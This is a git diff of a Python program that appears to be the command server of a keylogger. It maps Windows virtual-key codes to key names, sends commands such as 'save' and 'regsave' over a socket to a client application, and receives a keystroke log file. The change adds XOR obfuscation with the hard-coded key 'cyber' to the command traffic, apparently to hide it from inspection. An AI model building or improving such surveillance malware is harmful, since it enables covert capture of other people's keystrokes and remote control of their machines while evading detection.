@@ -45,6 +45,10 @@ key_dict = {1: 'Left mouse button', 2: 'Right mouse button', 3: 'Control-break p
             226: "The <> keys on the US standard keyboard, or the '\\|' key on the non-US 102-key keyboard", 229: 'IME PROCESS key', 
             231: 'Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods.', 246: 'Attn key', 247: 'CrSel key', 248: 'ExSel key', 
             249: 'Erase EOF key', 250: 'Play key', 251: 'Zoom key', 252: 'Reserved', 253: 'PA1 key', 254: 'Clear key'}
+def xor(data, key):
+    key_length = len(key)
+    return bytearray((data[i] ^ key[i % key_length]) for i in range(len(data)))
+
 
 def compute_checksum(file_path):
     sha256_hash = hashlib.sha256()
@@ -105,9 +109,10 @@ while True:
     command_client_socket, address = command_socket.accept()
 
     # Send the current command to the other application if there is any
-    command_client_socket.sendall(command.encode())
+    encoded_command = command.encode()
+    xor_encoded_command = xor(encoded_command, b'cyber') 
+    command_client_socket.sendall(xor_encoded_command)
 
-    # Handle the "save" and "regsave" commands
     # Handle the "save" and "regsave" commands
     if command in ['save', 'regsave']:
         file_name = 'received_logfile.log' if command == 'save' else ''
@@ -147,8 +152,6 @@ while True:
                         print(f"The file '{name}' has been modified.")
                 else:
                     print(f"No previous version of the file '{name}' exists.")
-
-
             
                     
         else:
